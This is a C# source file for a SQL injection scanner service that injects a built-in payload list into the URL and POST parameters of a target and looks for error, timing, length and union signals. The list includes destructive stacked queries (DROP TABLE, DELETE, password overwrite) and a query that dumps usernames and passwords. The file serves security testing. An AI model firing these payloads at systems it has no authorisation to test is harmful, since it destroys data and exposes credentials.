using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    public class SQLInjectionScannerService
    {
        private List<SQLInjectionPayload> _payloads = new List<SQLInjectionPayload>();
        private HttpClient _httpClient;
        private List<SQLIScanResult> _scanHistory = new List<SQLIScanResult>();

        public SQLInjectionScannerService()
        {
            _httpClient = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(30)
            };
            LoadDefaultPayloads();
        }

        public void LoadPayloadsFromFile(string filePath)
        {
            if (!File.Exists(filePath))
                throw new FileNotFoundException($"Payload file not found: {filePath}");

            _payloads.Clear();
            var lines = File.ReadAllLines(filePath);

            foreach (var line in lines)
            {
                var trimmed = line.Trim();
                if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith("#"))
                {
                    _payloads.Add(new SQLInjectionPayload
                    {
                        Payload = trimmed,
                        Type = DetectPayloadType(trimmed)
                    });
                }
            }
        }

        public void LoadDefaultPayloads()
        {
            var payloads = new List<(string payload, SQLInjectionType type)>
            {
                // Boolean-based blind
                ("' OR '1'='1", SQLInjectionType.BooleanBased),
                ("' OR '1'='1' --", SQLInjectionType.BooleanBased),
                ("' OR '1'='1' /*", SQLInjectionType.BooleanBased),
                ("' OR 1=1--", SQLInjectionType.BooleanBased),
                ("\" OR \"1\"=\"1", SQLInjectionType.BooleanBased),
                ("\" OR 1=1--", SQLInjectionType.BooleanBased),
                ("OR 1=1", SQLInjectionType.BooleanBased),
                ("' OR 'a'='a", SQLInjectionType.BooleanBased),
                ("' OR ''='", SQLInjectionType.BooleanBased),
                ("1' OR '1'='1", SQLInjectionType.BooleanBased),

                // Union-based
                ("' UNION SELECT NULL--", SQLInjectionType.UnionBased),
                ("' UNION SELECT NULL,NULL--", SQLInjectionType.UnionBased),
                ("' UNION SELECT NULL,NULL,NULL--", SQLInjectionType.UnionBased),
                ("' UNION ALL SELECT NULL--", SQLInjectionType.UnionBased),
                ("' UNION SELECT 'a',NULL--", SQLInjectionType.UnionBased),
                ("' UNION SELECT user(),database()--", SQLInjectionType.UnionBased),
                ("' UNION SELECT @@version,NULL--", SQLInjectionType.UnionBased),

                // Error-based
                ("'", SQLInjectionType.ErrorBased),
                ("\"", SQLInjectionType.ErrorBased),
                ("')", SQLInjectionType.ErrorBased),
                ("';", SQLInjectionType.ErrorBased),
                ("' AND 1=CONVERT(int,(SELECT @@version))--", SQLInjectionType.ErrorBased),
                ("' AND extractvalue(1,concat(0x7e,version()))--", SQLInjectionType.ErrorBased),
                ("' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--", SQLInjectionType.ErrorBased),

                // Time-based blind
                ("'; WAITFOR DELAY '00:00:05'--", SQLInjectionType.TimeBased),
                ("'; IF (1=1) WAITFOR DELAY '00:00:05'--", SQLInjectionType.TimeBased),
                ("' AND SLEEP(5)--", SQLInjectionType.TimeBased),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", SQLInjectionType.TimeBased),
                ("'; SELECT SLEEP(5)--", SQLInjectionType.TimeBased),
                ("1' AND SLEEP(5)#", SQLInjectionType.TimeBased),
                ("' OR SLEEP(5)--", SQLInjectionType.TimeBased),

                // Stacked queries
                ("'; DROP TABLE users--", SQLInjectionType.StackedQuery),
                ("'; DELETE FROM users--", SQLInjectionType.StackedQuery),
                ("'; UPDATE users SET password='hacked'--", SQLInjectionType.StackedQuery),

                // Authentication bypass
                ("admin' --", SQLInjectionType.AuthBypass),
                ("admin' #", SQLInjectionType.AuthBypass),
                ("admin'/*", SQLInjectionType.AuthBypass),
                ("' or 1=1--", SQLInjectionType.AuthBypass),
                ("' or 1=1#", SQLInjectionType.AuthBypass),
                ("' or 1=1/*", SQLInjectionType.AuthBypass),
                ("') or '1'='1--", SQLInjectionType.AuthBypass),
                ("') or ('1'='1--", SQLInjectionType.AuthBypass),

                // Advanced
                ("' AND 1=2 UNION SELECT NULL, table_name FROM information_schema.tables--", SQLInjectionType.UnionBased),
                ("' AND 1=2 UNION SELECT NULL, column_name FROM information_schema.columns--", SQLInjectionType.UnionBased),
                ("' AND 1=2 UNION SELECT NULL, CONCAT(username,':',password) FROM users--", SQLInjectionType.UnionBased),

                // NoSQL injection
                ("' || 1==1//", SQLInjectionType.NoSQL),
                ("' || 1==1%00", SQLInjectionType.NoSQL),
                ("{\"$gt\": \"\"}", SQLInjectionType.NoSQL),
                ("{\"$ne\": null}", SQLInjectionType.NoSQL),

                // Filter bypass
                ("' /*!OR*/ 1=1--", SQLInjectionType.BooleanBased),
                ("' OR 1=1%00", SQLInjectionType.BooleanBased),
                ("' %6f%72 1=1--", SQLInjectionType.BooleanBased),
                ("' /*!50000OR*/ 1=1--", SQLInjectionType.BooleanBased)
            };

            _payloads = payloads.Select(p => new SQLInjectionPayload
            {
                Payload = p.payload,
                Type = p.type
            }).ToList();
        }

        public async Task<SQLIScanReport> ScanUrl(string url, SQLIScanOptions options = null)
        {
            options = options ?? new SQLIScanOptions();

            var report = new SQLIScanReport
            {
                TargetUrl = url,
                StartTime = DateTime.Now,
                PayloadsUsed = _payloads.Count,
                Results = new List<SQLInjectionVulnerability>()
            };

            try
            {
                // Get baseline response
                var baseline = await GetBaselineResponse(url);
                if (baseline == null)
                {
                    report.Status = "Failed to get baseline response";
                    report.EndTime = DateTime.Now;
                    return report;
                }

                var parameters = ExtractParameters(url);
                if (!parameters.Any())
                {
                    report.Status = "No parameters found to test";
                    report.EndTime = DateTime.Now;
                    return report;
                }

                foreach (var param in parameters)
                {
                    foreach (var payload in _payloads)
                    {
                        report.TotalTests++;

                        var testUrl = InjectPayloadInParameter(url, param, payload.Payload);
                        var vulnerability = await TestPayload(testUrl, payload, $"Parameter: {param}", baseline, options);

                        if (vulnerability != null)
                        {
                            report.Results.Add(vulnerability);
                            report.VulnerabilitiesFound++;

                            if (options.StopOnFirstVulnerability)
                                break;
                        }

                        if (options.DelayBetweenRequests > 0)
                            await Task.Delay(options.DelayBetweenRequests);
                    }

                    if (options.StopOnFirstVulnerability && report.VulnerabilitiesFound > 0)
                        break;
                }

                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.Status = report.VulnerabilitiesFound > 0 ? "VULNERABLE" : "Not Vulnerable";

                _scanHistory.Add(new SQLIScanResult
                {
                    Url = url,
                    Timestamp = DateTime.Now,
                    VulnerabilitiesFound = report.VulnerabilitiesFound,
                    TotalTests = report.TotalTests
                });
            }
            catch (Exception ex)
            {
                report.Status = $"Error: {ex.Message}";
                report.EndTime = DateTime.Now;
            }

            return report;
        }

        public async Task<SQLIScanReport> ScanTrafficEntry(TrafficEntry entry, SQLIScanOptions options = null)
        {
            var report = await ScanUrl(entry.Url, options);

            // Test POST body if present
            if (entry.Method == "POST" && !string.IsNullOrEmpty(entry.RawRequest))
            {
                var bodyParams = ExtractPostBodyParameters(entry.RawRequest);
                var baseline = await GetBaselineResponse(entry.Url);

                foreach (var param in bodyParams)
                {
                    foreach (var payload in _payloads)
                    {
                        report.TotalTests++;

                        var modifiedBody = InjectPayloadInBody(entry.RawRequest, param.Key, payload.Payload);
                        var vulnerability = await TestPostRequest(entry.Url, modifiedBody, payload, $"POST Body: {param.Key}", baseline, options);

                        if (vulnerability != null)
                        {
                            report.Results.Add(vulnerability);
                            report.VulnerabilitiesFound++;
                        }
                    }
                }
            }

            return report;
        }

        private async Task<HttpResponseMessage> GetBaselineResponse(string url)
        {
            try
            {
                return await _httpClient.GetAsync(url);
            }
            catch
            {
                return null;
            }
        }

        private async Task<SQLInjectionVulnerability> TestPayload(string url, SQLInjectionPayload payload, string location, HttpResponseMessage baseline, SQLIScanOptions options)
        {
            try
            {
                var startTime = DateTime.Now;
                var response = await _httpClient.GetAsync(url);
                var duration = (DateTime.Now - startTime).TotalSeconds;

                var content = await response.Content.ReadAsStringAsync();
                var baselineContent = await baseline.Content.ReadAsStringAsync();

                var indicators = DetectSQLInjection(content, baselineContent, payload, duration);

                if (indicators.IsVulnerable)
                {
                    return new SQLInjectionVulnerability
                    {
                        Url = url,
                        Payload = payload.Payload,
                        Type = payload.Type,
                        InjectionPoint = location,
                        DetectionMethod = indicators.DetectionMethod,
                        Confidence = indicators.Confidence,
                        Severity = DetermineSeverity(payload.Type),
                        Evidence = indicators.Evidence,
                        StatusCode = (int)response.StatusCode,
                        ResponseTime = duration,
                        Timestamp = DateTime.Now
                    };
                }
            }
            catch
            {
                // Ignore errors
            }

            return null;
        }

        private async Task<SQLInjectionVulnerability> TestPostRequest(string url, string body, SQLInjectionPayload payload, string location, HttpResponseMessage baseline, SQLIScanOptions options)
        {
            try
            {
                var startTime = DateTime.Now;
                var content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                var response = await _httpClient.PostAsync(url, content);
                var duration = (DateTime.Now - startTime).TotalSeconds;

                var responseContent = await response.Content.ReadAsStringAsync();
                var baselineContent = await baseline.Content.ReadAsStringAsync();

                var indicators = DetectSQLInjection(responseContent, baselineContent, payload, duration);

                if (indicators.IsVulnerable)
                {
                    return new SQLInjectionVulnerability
                    {
                        Url = url,
                        Payload = payload.Payload,
                        Type = payload.Type,
                        InjectionPoint = location,
                        DetectionMethod = indicators.DetectionMethod,
                        Confidence = indicators.Confidence,
                        Severity = DetermineSeverity(payload.Type),
                        Evidence = indicators.Evidence,
                        StatusCode = (int)response.StatusCode,
                        ResponseTime = duration,
                        Timestamp = DateTime.Now
                    };
                }
            }
            catch
            {
                // Ignore errors
            }

            return null;
        }

        private SQLInjectionIndicators DetectSQLInjection(string response, string baseline, SQLInjectionPayload payload, double responseTime)
        {
            var indicators = new SQLInjectionIndicators();

            // Check for SQL error messages
            var errorPatterns = new[]
            {
                "SQL syntax.*?MySQL",
                "Warning.*?mysql_",
                "MySQLSyntaxErrorException",
                "valid MySQL result",
                "check the manual that corresponds to your MySQL",
                "PostgreSQL.*?ERROR",
                "Warning.*?\\Wpg_",
                "valid PostgreSQL result",
                "Npgsql\\.",
                "Microsoft SQL Server",
                "Driver.*? SQL[\\-\\_\\ ]*Server",
                "OLE DB.*? SQL Server",
                "ODBC SQL Server Driver",
                "SQLServer JDBC Driver",
                "macromedia\\.jdbc\\.sqlserver",
                "Oracle error",
                "Oracle.*?Driver",
                "Warning.*?\\Woci_",
                "Warning.*?\\Wora_",
                "SQLite/JDBCDriver",
                "SQLite.Exception",
                "System.Data.SQLite.SQLiteException",
                "sqlite3.OperationalError:",
                "SQLITE_ERROR",
                "Sybase message",
                "Warning.*?sybase",
                "Sybase.*?Server message"
            };

            foreach (var pattern in errorPatterns)
            {
                if (Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase))
                {
                    indicators.IsVulnerable = true;
                    indicators.DetectionMethod = "Error-based";
                    indicators.Confidence = "High";
                    indicators.Evidence = ExtractEvidence(response, pattern);
                    return indicators;
                }
            }

            // Check for time-based blind SQLi
            if (payload.Type == SQLInjectionType.TimeBased && responseTime > 4.5)
            {
                indicators.IsVulnerable = true;
                indicators.DetectionMethod = "Time-based blind";
                indicators.Confidence = "High";
                indicators.Evidence = $"Response time: {responseTime:F2}s (expected delay: 5s)";
                return indicators;
            }

            // Check for boolean-based (significant difference in response)
            if (payload.Type == SQLInjectionType.BooleanBased)
            {
                var baselineLength = baseline.Length;
                var responseLength = response.Length;
                var difference = Math.Abs(baselineLength - responseLength);

                if (difference > 100 || (difference > 10 && baselineLength > 0 && (double)difference / baselineLength > 0.1))
                {
                    indicators.IsVulnerable = true;
                    indicators.DetectionMethod = "Boolean-based blind";
                    indicators.Confidence = "Medium";
                    indicators.Evidence = $"Response length difference: {difference} bytes";
                    return indicators;
                }
            }

            // Check for Union-based (look for injected data)
            if (payload.Type == SQLInjectionType.UnionBased)
            {
                if (response.Contains("NULL") && !baseline.Contains("NULL"))
                {
                    indicators.IsVulnerable = true;
                    indicators.DetectionMethod = "Union-based";
                    indicators.Confidence = "High";
                    indicators.Evidence = "Union query appears successful";
                    return indicators;
                }
            }

            return indicators;
        }

        private string ExtractEvidence(string response, string pattern)
        {
            var match = Regex.Match(response, pattern, RegexOptions.IgnoreCase);
            if (match.Success)
            {
                var start = Math.Max(0, match.Index - 50);
                var length = Math.Min(response.Length - start, match.Length + 100);
                return response.Substring(start, length);
            }
            return "";
        }

        private string DetermineSeverity(SQLInjectionType type)
        {
            return type switch
            {
                SQLInjectionType.StackedQuery => "Critical",
                SQLInjectionType.UnionBased => "High",
                SQLInjectionType.ErrorBased => "High",
                SQLInjectionType.AuthBypass => "Critical",
                SQLInjectionType.TimeBased => "Medium",
                SQLInjectionType.BooleanBased => "Medium",
                _ => "Medium"
            };
        }

        private List<string> ExtractParameters(string url)
        {
            var parameters = new List<string>();
            var uri = new Uri(url);

            if (!string.IsNullOrEmpty(uri.Query))
            {
                var query = uri.Query.TrimStart('?');
                var parts = query.Split('&');

                foreach (var part in parts)
                {
                    var keyValue = part.Split('=');
                    if (keyValue.Length > 0)
                    {
                        parameters.Add(keyValue[0]);
                    }
                }
            }

            return parameters;
        }

        private Dictionary<string, string> ExtractPostBodyParameters(string rawRequest)
        {
            var parameters = new Dictionary<string, string>();
            var bodyStart = rawRequest.IndexOf("\r\n\r\n");
            if (bodyStart == -1) return parameters;

            var body = rawRequest.Substring(bodyStart + 4);
            var parts = body.Split('&');

            foreach (var part in parts)
            {
                var keyValue = part.Split('=');
                if (keyValue.Length >= 1)
                {
                    parameters[keyValue[0]] = keyValue.Length > 1 ? keyValue[1] : "";
                }
            }

            return parameters;
        }

        private string InjectPayloadInParameter(string url, string parameter, string payload)
        {
            var uri = new Uri(url);
            var queryParams = HttpUtility.ParseQueryString(uri.Query);
            queryParams[parameter] = payload;

            var builder = new UriBuilder(uri)
            {
                Query = queryParams.ToString()
            };

            return builder.ToString();
        }

        private string InjectPayloadInBody(string rawRequest, string parameter, string payload)
        {
            var bodyStart = rawRequest.IndexOf("\r\n\r\n");
            if (bodyStart == -1) return rawRequest;

            var headers = rawRequest.Substring(0, bodyStart);
            var body = rawRequest.Substring(bodyStart + 4);

            var parts = body.Split('&').ToList();
            for (int i = 0; i < parts.Count; i++)
            {
                var keyValue = parts[i].Split('=');
                if (keyValue.Length > 0 && keyValue[0] == parameter)
                {
                    parts[i] = $"{parameter}={HttpUtility.UrlEncode(payload)}";
                }
            }

            return headers + "\r\n\r\n" + string.Join("&", parts);
        }

        private SQLInjectionType DetectPayloadType(string payload)
        {
            if (payload.Contains("UNION")) return SQLInjectionType.UnionBased;
            if (payload.Contains("SLEEP") || payload.Contains("WAITFOR")) return SQLInjectionType.TimeBased;
            if (payload.Contains("DROP") || payload.Contains("DELETE")) return SQLInjectionType.StackedQuery;
            if (payload.Contains("admin")) return SQLInjectionType.AuthBypass;
            if (payload == "'" || payload == "\"") return SQLInjectionType.ErrorBased;
            return SQLInjectionType.BooleanBased;
        }

        public string GenerateReport(SQLIScanReport report)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════");
            sb.AppendLine("        SQL INJECTION VULNERABILITY SCAN REPORT");
            sb.AppendLine("═══════════════════════════════════════════════════");
            sb.AppendLine($"Target URL: {report.TargetUrl}");
            sb.AppendLine($"Scan Time: {report.StartTime}");
            sb.AppendLine($"Duration: {report.Duration:F2} seconds");
            sb.AppendLine($"Status: {report.Status}");
            sb.AppendLine();
            sb.AppendLine($"Total Tests: {report.TotalTests}");
            sb.AppendLine($"Payloads Used: {report.PayloadsUsed}");
            sb.AppendLine($"Vulnerabilities Found: {report.VulnerabilitiesFound}");
            sb.AppendLine();

            if (report.Results.Any())
            {
                sb.AppendLine("VULNERABILITIES DETECTED:");
                sb.AppendLine("═════════════════════════════════════════════════");

                var grouped = report.Results.GroupBy(v => v.Type);
                foreach (var group in grouped)
                {
                    sb.AppendLine();
                    sb.AppendLine($"[{group.Key}] - {group.Count()} vulnerability(ies)");
                    sb.AppendLine(new string('-', 50));

                    foreach (var vuln in group)
                    {
                        sb.AppendLine($"  Severity: {vuln.Severity} | Confidence: {vuln.Confidence}");
                        sb.AppendLine($"  Location: {vuln.InjectionPoint}");
                        sb.AppendLine($"  Payload: {vuln.Payload}");
                        sb.AppendLine($"  Detection: {vuln.DetectionMethod}");
                        if (!string.IsNullOrEmpty(vuln.Evidence))
                        {
                            sb.AppendLine($"  Evidence: {vuln.Evidence.Substring(0, Math.Min(80, vuln.Evidence.Length))}...");
                        }
                        sb.AppendLine();
                    }
                }
            }
            else
            {
                sb.AppendLine("No SQL injection vulnerabilities detected.");
            }

            sb.AppendLine("═══════════════════════════════════════════════════");

            return sb.ToString();
        }

        public int GetPayloadCount() => _payloads.Count;
        public List<SQLIScanResult> GetScanHistory() => _scanHistory;
    }

    public class SQLIScanOptions
    {
        public bool StopOnFirstVulnerability { get; set; } = false;
        public int DelayBetweenRequests { get; set; } = 100; // milliseconds
        public int TimeoutSeconds { get; set; } = 30;
    }

    public class SQLIScanReport
    {
        public string TargetUrl { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public string Status { get; set; }
        public int TotalTests { get; set; }
        public int PayloadsUsed { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public List<SQLInjectionVulnerability> Results { get; set; }
    }

    public class SQLInjectionVulnerability
    {
        public string Url { get; set; }
        public string Payload { get; set; }
        public SQLInjectionType Type { get; set; }
        public string InjectionPoint { get; set; }
        public string DetectionMethod { get; set; }
        public string Confidence { get; set; }
        public string Severity { get; set; }
        public string Evidence { get; set; }
        public int StatusCode { get; set; }
        public double ResponseTime { get; set; }
        public DateTime Timestamp { get; set; }
    }

    public class SQLInjectionPayload
    {
        public string Payload { get; set; }
        public SQLInjectionType Type { get; set; }
    }

    public class SQLInjectionIndicators
    {
        public bool IsVulnerable { get; set; }
        public string DetectionMethod { get; set; }
        public string Confidence { get; set; }
        public string Evidence { get; set; }
    }

    public class SQLIScanResult
    {
        public string Url { get; set; }
        public DateTime Timestamp { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public int TotalTests { get; set; }
    }

    public enum SQLInjectionType
    {
        BooleanBased,
        UnionBased,
        ErrorBased,
        TimeBased,
        StackedQuery,
        AuthBypass,
        NoSQL
    }
}
